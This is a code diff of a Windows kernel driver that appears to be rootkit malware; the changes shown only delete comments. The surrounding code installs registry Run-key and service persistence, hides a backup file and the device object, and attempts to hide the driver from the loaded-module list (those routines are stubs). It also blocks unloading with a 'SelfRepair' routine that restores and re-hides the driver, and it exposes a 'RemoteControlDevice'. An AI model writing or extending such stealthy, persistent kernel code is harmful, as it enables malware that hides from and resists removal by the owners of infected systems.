@@ -173,7 +173,6 @@ RestoreDriverFromBackup(VOID)
     UNICODE_STRING backupPath;
     RtlInitUnicodeString(&backupPath, HIDDEN_BACKUP_PATH);
 
-    // Initialize object attributes for opening the backup file
     InitializeObjectAttributes(&objectAttributes, &backupPath, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
     status = ZwCreateFile(&backupHandle, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
     if (!NT_SUCCESS(status)) {
@@ -185,7 +184,6 @@ RestoreDriverFromBackup(VOID)
     UNICODE_STRING devicePath;
     RtlInitUnicodeString(&devicePath, L"\\Device\\RemoteControlDevice");
 
-    // Initialize object attributes for creating or opening the device file
     InitializeObjectAttributes(&objectAttributes, &devicePath, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
     status = ZwCreateFile(&fileHandle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE, NULL, 0);
     if (NT_SUCCESS(status)) {
@@ -208,12 +206,10 @@ RestoreDriverFromBackup(VOID)
     ZwClose(backupHandle);
 }
 
-// Timer-related global variables
 KTIMER g_Timer;
 KDPC g_Dpc;
 BOOLEAN g_TimerStarted = FALSE;
 
-// Define necessary structures for NtQuerySystemInformation
 typedef enum _SYSTEM_INFORMATION_CLASS {
     SystemModuleInformation = 11
 } SYSTEM_INFORMATION_CLASS;
@@ -269,8 +265,6 @@ ObscureDriverFromModuleList(PDRIVER_OBJECT DriverObject)
         for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
             PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
             if (moduleEntry->Base == DriverObject->DriverSection) {
-                // Remove the driver from the list
-                // Implementation of removal is specific to needs
                 DbgPrint("[+] Driver obscured from module list.\n");
                 break;
             }
@@ -312,8 +306,6 @@ UnlinkDriverFromModuleList(PDRIVER_OBJECT DriverObject)
         for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
             PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
             if (moduleEntry->Base == DriverObject->DriverSection) {
-                // Perform removal from the list here
-                // This code should be implemented based on specific needs
                 DbgPrint("[+] Driver removed from module list.\n");
                 break;
             }
@@ -355,8 +347,6 @@ RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject)
         for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
             PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
             if (moduleEntry->Base == DriverObject->DriverSection) {
-                // Remove the driver from the list
-                // Actual removal is not implemented here due to complexity
                 DbgPrint("[+] Driver removed from loaded modules list.\n");
                 break;
             }
@@ -366,14 +356,14 @@ RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject)
         DbgPrint("[-] Failed to query system information.\n");
     }
 
-    ExFreePool2(buffer, 0, NULL, 0); // Use ExFreePool2 for memory deallocation
+    ExFreePool2(buffer, 0, NULL, 0);
 }
 
-// Function to handle registry persistence
+// handle registry persistence
 VOID 
 InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject)
 {
-    UNREFERENCED_PARAMETER(DriverObject); // Suppress warning about unused parameter
+    UNREFERENCED_PARAMETER(DriverObject);
 
     UNICODE_STRING keyName = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
     HANDLE keyHandle;
@@ -420,11 +410,9 @@ InstallServicePersistence(IN PDRIVER_OBJECT DriverObject)
     OBJECT_ATTRIBUTES objectAttributes;
     NTSTATUS status;
 
-    // Initialize the path to the driver
     RtlStringCbPrintfW(path, sizeof(path), L"\\Device\\RemoteControlDevice");
     RtlInitUnicodeString(&driverPath, path);
 
-    // Create or open the service key
     InitializeObjectAttributes(&objectAttributes, &serviceName, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
     status = ZwOpenKey(&serviceKey, KEY_SET_VALUE, &objectAttributes);
     if (NT_SUCCESS(status)) {
@@ -443,20 +431,15 @@ InstallServicePersistence(IN PDRIVER_OBJECT DriverObject)
     }
 }
 
-// Function to handle self-repair and re-installation
 VOID 
 SelfRepair(IN PDRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
     UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\RemoteControlLink");
 
-    // Backup the driver image
+    // Backup 
     CreateDriverBackup();
-
-    // Remove the driver
     HideDeviceObject(DriverObject);
-
-    // Recreate the device and symbolic link
     PDEVICE_OBJECT deviceObject = NULL;
     NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
     if (NT_SUCCESS(status)) {
@@ -473,16 +456,15 @@ SelfRepair(IN PDRIVER_OBJECT DriverObject)
         DbgPrint("[-] Failed to re-create device.\n");
     }
 
-    // Restore from backup if needed
+    // Restore
     RestoreDriverFromBackup();
 
-    // Reapply hiding techniques and persistence
+    // hiding techniques and persistence
     HideDriver(DriverObject);
     InstallRegistryPersistence(DriverObject);
     InstallServicePersistence(DriverObject);
 }
 
-// Function to unload the driver with a self-repair mechanism
 VOID 
 UnloadDriver(IN PDRIVER_OBJECT DriverObject)
 {
@@ -490,7 +472,6 @@ UnloadDriver(IN PDRIVER_OBJECT DriverObject)
     g_DriverObject = DriverObject;
     DbgPrint("[-] Unloading driver.\n");
 
-    // Attempt to self-repair if unloading is initiated
     if (g_DriverObject != NULL) {
         SelfRepair(g_DriverObject);
     }
@@ -553,16 +534,12 @@ DriverEntry(IN PDRIVER_OBJECT DriverObject,
     KeSetTimer(&g_Timer, dueTime, &g_Dpc);
     g_TimerStarted = TRUE;
 
-    // Install registry persistence
     InstallRegistryPersistence(DriverObject);
 
-    // Install service persistence
     InstallServicePersistence(DriverObject);
 
-    // Hide the backup file
     HideBackupFile();
 
-    // Obscure the driver from the module list
     ObscureDriverFromModuleList(DriverObject);
 
     DbgPrint("[+] Driver loaded and persistence set.\n");
